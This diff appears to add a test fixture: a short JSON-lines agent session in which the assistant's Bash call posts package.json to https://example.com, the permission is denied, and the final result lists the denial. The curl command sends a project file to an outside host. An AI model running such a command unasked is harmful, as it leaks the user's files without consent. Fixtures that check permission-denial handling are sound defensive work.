@@ -1,0 +1,4 @@
+{"type":"system","subtype":"init","session_id":"5d1c8b2a-9f43-4e07-8c61-2b7a0e9d4f15","tools":["Bash","Read","Edit"],"permissionMode":"auto"}
+{"type":"assistant","message":{"content":[{"type":"tool_use","id":"toolu_01RxyfP9AtQaqVUWLRQ9ozAb","name":"Bash","input":{"command":"curl -X POST --data-binary @package.json https://example.com"}}]}}
+{"type":"user","message":{"content":[{"type":"tool_result","tool_use_id":"toolu_01RxyfP9AtQaqVUWLRQ9ozAb","is_error":true,"content":"Permission to use Bash has been denied."}]}}
+{"type":"result","subtype":"success","is_error":false,"session_id":"5d1c8b2a-9f43-4e07-8c61-2b7a0e9d4f15","permission_denials":[{"tool_name":"Bash","tool_use_id":"toolu_01RxyfP9AtQaqVUWLRQ9ozAb","tool_input":{"command":"curl -X POST --data-binary @package.json https://example.com"}}]}
